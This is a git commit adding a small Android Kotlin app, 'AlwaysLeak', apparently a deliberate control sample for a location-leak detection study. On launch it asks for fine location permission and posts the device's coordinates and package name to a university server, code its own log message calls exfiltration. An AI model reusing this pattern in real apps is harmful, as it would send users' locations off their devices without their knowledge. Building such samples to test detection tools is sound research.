003da972b5c570577d7e2da4607389415d784d87
Timme Bethe <timme@timmebethe.nl>
2021-06-16 11:59:21 +0200

    Added new app - AlwaysLeak
    As the name suggests, it just always leaks. It's a control group.

---
+++ AlwaysLeak/app/src/main/java/nl/tbethe/shadowdroid/alwaysleak/MainActivity.kt
@@ -0,0 +1,83 @@
+package nl.tbethe.shadowdroid.alwaysleak
+
+import android.Manifest
+import android.annotation.SuppressLint
+import android.content.pm.PackageManager
+import android.location.Criteria
+import android.location.LocationManager
+import androidx.appcompat.app.AppCompatActivity
+import android.os.Bundle
+import android.util.Log
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.annotation.RequiresPermission
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+
+private const val TAG = "MainActivity"
+
+
+
+class MainActivity : AppCompatActivity() {
+
+    @SuppressLint("MissingPermission")
+    val requestPermission =
+        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+            if (isGranted) sendLocation()
+        }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        leakLocation()
+    }
+
+    private fun leakLocation() {
+
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
+        }
+    }
+
+    @RequiresPermission("android.permission.ACCESS_FINE_LOCATION")
+    @SuppressLint("MissingPermission")
+    private fun sendLocation() {
+        val locationManager = getSystemService(LocationManager::class.java)
+        val provider : String? = locationManager.getBestProvider(Criteria(), true)
+        provider?.let {
+            locationManager.requestSingleUpdate(provider, { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("latitude", "${loc.latitude}")
+                                    append("longitude", "${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }, null)
+        }
+    }
+}
